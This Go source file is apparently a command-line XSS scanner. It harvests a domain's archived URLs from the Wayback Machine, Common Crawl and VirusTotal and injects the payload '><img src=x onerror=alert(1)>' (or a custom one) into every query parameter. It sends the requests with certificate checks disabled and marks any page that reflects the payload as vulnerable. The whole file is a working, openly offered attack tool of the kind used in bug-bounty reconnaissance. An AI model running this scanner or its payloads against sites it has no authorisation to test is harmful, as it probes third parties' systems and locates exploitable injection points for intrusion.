package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
//	"sort"
	"strings"
	"sync"
	"time"
)

type wurl struct {
	date string
	url  string
}

type fetchFn func(string, bool) ([]wurl, error)

var (
	headers      []string
	concurrency  int
	xsspayload   string
	proxy        string
	poc          bool
	appendMode   bool
	ignorePath   bool
	dates        bool
	noSubs       bool
	getVersionsFlag bool
)

func init() {
	flag.BoolVar(&appendMode, "a", false, "Append the value instead of replacing it")
	flag.BoolVar(&ignorePath, "ignore-path", false, "Ignore the path when considering what constitutes a duplicate")
	flag.BoolVar(&dates, "dates", false, "show date of fetch in the first column")
	flag.BoolVar(&noSubs, "no-subs", false, "don't include subdomains of the target domain")
	flag.BoolVar(&getVersionsFlag, "get-versions", false, "list URLs for crawled versions of input URL(s)")
	flag.IntVar(&concurrency, "c", 50, "Set concurrency")
	flag.StringVar(&xsspayload, "payload", "", "XSS payload")
	flag.StringVar(&proxy, "proxy", "0", "Send traffic to a proxy")
	flag.BoolVar(&poc, "only-poc", false, "Show only potentially vulnerable URLs")
	flag.Var((*customheaders)(&headers), "headers", "Headers")
}

type customheaders []string

func (h *customheaders) String() string {
	return "Custom headers"
}

func (h *customheaders) Set(value string) error {
	*h = append(*h, value)
	return nil
}

func main() {
	flag.Parse()

	var domains []string
	if flag.NArg() > 0 {
		domains = []string{flag.Arg(0)}
	} else {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			domains = append(domains, sc.Text())
		}
		if err := sc.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "failed to read input: %s\n", err)
		}
	}

	if getVersionsFlag {
		for _, u := range domains {
			versions, err := getVersions(u)
			if err != nil {
				continue
			}
			fmt.Println(strings.Join(versions, "\n"))
		}
		return
	}

	fetchFns := []fetchFn{
		getWaybackURLs,
		getCommonCrawlURLs,
		getVirusTotalURLs,
	}

	seen := make(map[string]bool)
	var wg sync.WaitGroup
	urls := make(chan string)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for u := range urls {
				if xsspayload != "" {
					x := xss(u, xsspayload, proxy, poc)
					if x != "ERROR" {
						fmt.Println(x)
					}
				} else {
					x := xssDefault(u, xsspayload, proxy, poc)
					if x != "ERROR" {
						fmt.Println(x)
					}
				}
			}
		}()
	}

	for _, domain := range domains {
		var fetchWg sync.WaitGroup
		wurls := make(chan wurl)

		for _, fn := range fetchFns {
			fetchWg.Add(1)
			go func(f fetchFn) {
				defer fetchWg.Done()
				resp, err := f(domain, noSubs)
				if err != nil {
					return
				}
				for _, r := range resp {
					if noSubs && isSubdomain(r.url, domain) {
						continue
					}
					wurls <- r
				}
			}(fn)
		}

		go func() {
			fetchWg.Wait()
			close(wurls)
		}()

		for w := range wurls {
			if _, ok := seen[w.url]; ok {
				continue
			}
			seen[w.url] = true

			if dates {
				d, err := time.Parse("20060102150405", w.date)
				if err != nil {
					fmt.Fprintf(os.Stderr, "failed to parse date [%s] for URL [%s]\n", w.date, w.url)
				}
				fmt.Printf("%s %s\n", d.Format(time.RFC3339), w.url)
			} else {
				urls <- w.url
			}
		}
	}

	close(urls)
	wg.Wait()
}

func getWaybackURLs(domain string, noSubs bool) ([]wurl, error) {
	subsWildcard := "*."
	if noSubs {
		subsWildcard = ""
	}

	res, err := http.Get(fmt.Sprintf("http://web.archive.org/cdx/search/cdx?url=%s%s/*&output=json&collapse=urlkey", subsWildcard, domain))
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	raw, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	var wrapper [][]string
	if err := json.Unmarshal(raw, &wrapper); err != nil {
		return nil, err
	}

	out := make([]wurl, 0, len(wrapper))
	skip := true
	for _, urls := range wrapper {
		if skip {
			skip = false
			continue
		}
		out = append(out, wurl{date: urls[1], url: urls[2]})
	}

	return out, nil
}

func getCommonCrawlURLs(domain string, noSubs bool) ([]wurl, error) {
	subsWildcard := "*."
	if noSubs {
		subsWildcard = ""
	}

	res, err := http.Get(fmt.Sprintf("http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=%s%s/*&output=json", subsWildcard, domain))
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	sc := bufio.NewScanner(res.Body)
	out := make([]wurl, 0)

	for sc.Scan() {
		wrapper := struct {
			URL       string `json:"url"`
			Timestamp string `json:"timestamp"`
		}{}
		if err := json.Unmarshal(sc.Bytes(), &wrapper); err != nil {
			continue
		}
		out = append(out, wurl{date: wrapper.Timestamp, url: wrapper.URL})
	}

	return out, nil
}

func getVirusTotalURLs(domain string, noSubs bool) ([]wurl, error) {
	out := make([]wurl, 0)

	apiKey := os.Getenv("VT_API_KEY")
	if apiKey == "" {
		return out, nil
	}

	resp, err := http.Get(fmt.Sprintf("https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s", apiKey, domain))
	if err != nil {
		return out, err
	}
	defer resp.Body.Close()

	wrapper := struct {
		URLs []struct {
			URL string `json:"url"`
		} `json:"detected_urls"`
	}{}

	if err := json.NewDecoder(resp.Body).Decode(&wrapper); err != nil {
		return out, err
	}

	for _, u := range wrapper.URLs {
		out = append(out, wurl{url: u.URL})
	}

	return out, nil
}

func isSubdomain(rawUrl, domain string) bool {
	u, err := url.Parse(rawUrl)
	if err != nil {
		return false
	}
	return strings.ToLower(u.Hostname()) != strings.ToLower(domain)
}

func getVersions(u string) ([]string, error) {
	out := make([]string, 0)

	resp, err := http.Get(fmt.Sprintf("http://web.archive.org/cdx/search/cdx?url=%s&output=json", u))
	if err != nil {
		return out, err
	}
	defer resp.Body.Close()

	var r [][]string
	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
		return out, err
	}

	first := true
	seen := make(map[string]bool)
	for _, s := range r {
		if first {
			first = false
			continue
		}
		if seen[s[5]] {
			continue
		}
		seen[s[5]] = true
		out = append(out, fmt.Sprintf("https://web.archive.org/web/%sif_/%s", s[1], s[2]))
	}

	return out, nil
}

func xss(urlt string, xssp string, proxy string, onlypoc bool) string {
	client := createClient(proxy)
	res, err := http.NewRequest("GET", urlt, nil)
	if err != nil {
		return "ERROR"
	}
	res.Header.Set("Connection", "close")
	for _, v := range headers {
		s := strings.SplitN(v, ":", 2)
		res.Header.Set(s[0], s[1])
	}

	resp, err := client.Do(res)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	page := string(body)
	xssp = regexp.QuoteMeta(xssp)
	match, _ := regexp.MatchString(xssp, page)

	if onlypoc && match {
		return urlt
	} else if match {
		return "\033[1;31mVulnerable - " + urlt + "\033[0;0m"
	} else if !onlypoc {
		return "\033[1;30mNot Vulnerable - " + urlt + "\033[0;0m"
	}
	return "ERROR"
}

func xssDefault(urlt string, xssp string, proxy string, onlypoc bool) string {
	client := createClient(proxy)
	u, err := url.Parse(urlt)
	if err != nil {
		return "ERROR"
	}

	defaultPayload := "><img src=x onerror=alert(1)>"
	q := u.Query()
	for x := range q {
		q.Set(x, defaultPayload)
	}
	u.RawQuery = q.Encode()
	urlt = u.String()

	res, err := http.NewRequest("GET", urlt, nil)
	if err != nil {
		return "ERROR"
	}
	res.Header.Set("Connection", "close")
	for _, v := range headers {
		s := strings.SplitN(v, ":", 2)
		res.Header.Set(s[0], s[1])
	}

	resp, err := client.Do(res)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	page := string(body)
	xssp = regexp.QuoteMeta(defaultPayload)
	match, _ := regexp.MatchString(xssp, page)

	if onlypoc && match {
		return urlt
	} else if match {
		return "\033[1;31mVulnerable - " + urlt + "\033[0;0m"
	} else if !onlypoc {
		return "\033[1;30mNot Vulnerable - " + urlt + "\033[0;0m"
	}
	return "ERROR"
}

func createClient(proxy string) *http.Client {
	trans := &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: time.Second,
		}).DialContext,
	}

	if proxy != "0" {
		if p, err := url.Parse(proxy); err == nil {
			trans.Proxy = http.ProxyURL(p)
		}
	}

	return &http.Client{
		Transport: trans,
		Timeout:   3 * time.Second,
	}
}
